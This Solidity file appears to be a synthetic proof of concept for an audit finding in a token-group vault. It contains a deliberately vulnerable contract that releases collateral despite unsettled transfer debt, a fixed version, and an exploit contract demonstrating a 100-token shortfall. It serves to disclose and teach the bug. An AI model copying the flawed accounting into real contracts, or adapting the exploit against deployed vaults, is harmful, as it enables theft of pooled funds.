// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Radius EVMAuth — _transferGroups returns while debt is still positive
    (Trail of Bits, Radius Technology, October 2025).
    SYNTHETIC, cheatcode-free, one block. No warp.
    Alice holds 5 tokens: 2 already expired (expiresAt == block.timestamp)
    and 3 live. A transfer of 4 moves the ERC1155 balance and releases
    400 COLL, but the group loop can only move the 3 live tokens.
    debt left is N = 1, so the pool is short 100 COLL against live groups.
    Control reverts while that debt remains and moves nothing.
    This is the transfer bug. It is not the group-burn bug. */

contract Collateral {
    string public constant name = "Collateral";
    string public constant symbol = "COLL";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract GroupVault {
    struct Group {
        uint256 balance;
        uint256 expiresAt;
    }

    uint256 public constant UNIT = 100 ether;
    Collateral public collateral;
    uint256 public debtLeft;
    mapping(address => mapping(uint256 => Group[])) internal groups;
    mapping(address => mapping(uint256 => uint256)) public erc1155Balance;

    constructor(Collateral collateral_) {
        collateral = collateral_;
    }

    function seed(address account, uint256 id) external {
        groups[account][id].push(Group({balance: 2, expiresAt: 1}));
        groups[account][id].push(Group({balance: 3, expiresAt: type(uint256).max}));
        erc1155Balance[account][id] = 5;
    }

    function groupSum(address account, uint256 id) public view returns (uint256 sum) {
        Group[] storage list = groups[account][id];
        uint256 n = list.length;
        for (uint256 i = 0; i < n; i++) {
            sum += list[i].balance;
        }
    }

    function transfer(address from, address to, uint256 id, uint256 amount) external {
        erc1155Balance[from][id] -= amount;
        erc1155Balance[to][id] += amount;
        _transferGroups(from, to, id, amount);
        uint256 released = amount * UNIT;
        collateral.transfer(to, released);
    }

    function _upsertGroup(address to, uint256 id, uint256 amount, uint256 expiresAt) internal {
        groups[to][id].push(Group({balance: amount, expiresAt: expiresAt}));
    }

    function _pruneGroups(address account, uint256 id) internal {
        Group[] storage list = groups[account][id];
        uint256 i = 0;
        while (i < list.length) {
            if (list[i].expiresAt <= block.timestamp || list[i].balance == 0) {
                list[i] = list[list.length - 1];
                list.pop();
            } else {
                i++;
            }
        }
    }

    function _transferGroups(address from, address to, uint256 id, uint256 amount) internal {
        if (from == to || amount == 0) return;
        Group[] storage list = groups[from][id];
        uint256 _now = block.timestamp;
        uint256 debt = amount;
        for (uint256 i = 0; i < list.length && debt > 0; i++) {
            if (list[i].expiresAt <= _now || list[i].balance == 0) {
                continue;
            }
            if (list[i].balance > debt) {
                _upsertGroup(to, id, debt, list[i].expiresAt);
                list[i].balance -= debt;
                debt = 0;
            } else {
                _upsertGroup(to, id, list[i].balance, list[i].expiresAt);
                debt -= list[i].balance;
                list[i].balance = 0;
            }
        }
        _pruneGroups(from, id);
        this.settle(debt);
    }

    function settle(uint256 debt) external {
        require(msg.sender == address(this), "self");
        uint256 left = debt;
        // @> VULN: nonzero debt is accepted and the collateral release still runs
        if (left == 0) {
            debtLeft = 0;
        } else {
            debtLeft = left;
        }
    }
}

contract GroupVaultFixed {
    struct Group {
        uint256 balance;
        uint256 expiresAt;
    }

    uint256 public constant UNIT = 100 ether;
    Collateral public collateral;
    uint256 public debtLeft;
    mapping(address => mapping(uint256 => Group[])) internal groups;
    mapping(address => mapping(uint256 => uint256)) public erc1155Balance;

    constructor(Collateral collateral_) {
        collateral = collateral_;
    }

    function seed(address account, uint256 id) external {
        groups[account][id].push(Group({balance: 2, expiresAt: 1}));
        groups[account][id].push(Group({balance: 3, expiresAt: type(uint256).max}));
        erc1155Balance[account][id] = 5;
    }

    function groupSum(address account, uint256 id) public view returns (uint256 sum) {
        Group[] storage list = groups[account][id];
        uint256 n = list.length;
        for (uint256 i = 0; i < n; i++) {
            sum += list[i].balance;
        }
    }

    function transfer(address from, address to, uint256 id, uint256 amount) external {
        erc1155Balance[from][id] -= amount;
        erc1155Balance[to][id] += amount;
        _transferGroups(from, to, id, amount);
        uint256 released = amount * UNIT;
        collateral.transfer(to, released);
    }

    function _upsertGroup(address to, uint256 id, uint256 amount, uint256 expiresAt) internal {
        groups[to][id].push(Group({balance: amount, expiresAt: expiresAt}));
    }

    function _pruneGroups(address account, uint256 id) internal {
        Group[] storage list = groups[account][id];
        uint256 i = 0;
        while (i < list.length) {
            if (list[i].expiresAt <= block.timestamp || list[i].balance == 0) {
                list[i] = list[list.length - 1];
                list.pop();
            } else {
                i++;
            }
        }
    }

    function _transferGroups(address from, address to, uint256 id, uint256 amount) internal {
        if (from == to || amount == 0) return;
        Group[] storage list = groups[from][id];
        uint256 _now = block.timestamp;
        uint256 debt = amount;
        for (uint256 i = 0; i < list.length && debt > 0; i++) {
            if (list[i].expiresAt <= _now || list[i].balance == 0) {
                continue;
            }
            if (list[i].balance > debt) {
                _upsertGroup(to, id, debt, list[i].expiresAt);
                list[i].balance -= debt;
                debt = 0;
            } else {
                _upsertGroup(to, id, list[i].balance, list[i].expiresAt);
                debt -= list[i].balance;
                list[i].balance = 0;
            }
        }
        _pruneGroups(from, id);
        // FIX: do not release collateral for a transfer the groups could not finish
        require(debt == 0, "debt");
        debtLeft = debt;
    }
}

contract Exploit {
    Collateral public collateral;
    GroupVault public vault;
    address public alice;
    uint256 public moved;
    uint256 public debt;
    uint256 public shortfall;

    constructor() {
        collateral = new Collateral();
        vault = new GroupVault(collateral);
        alice = address(0xA11CE);
    }

    function run() external {
        collateral.mint(address(vault), 500 ether);
        vault.seed(alice, 1);
        vault.transfer(alice, address(this), 1, 4);
        moved = collateral.balanceOf(address(this));
        debt = vault.debtLeft();
        uint256 backed = vault.groupSum(address(this), 1) * vault.UNIT();
        shortfall = moved - backed;
        require(debt == 1, "debt");
        require(moved == 400 ether, "moved");
        require(vault.groupSum(address(this), 1) == 3, "groups");
        require(shortfall == 100 ether, "short");
        require(collateral.balanceOf(address(vault)) == 100 ether, "pool");
        require(vault.erc1155Balance(address(this), 1) == 4, "credited");
        require(vault.erc1155Balance(alice, 1) == 1, "alice left");
    }
}
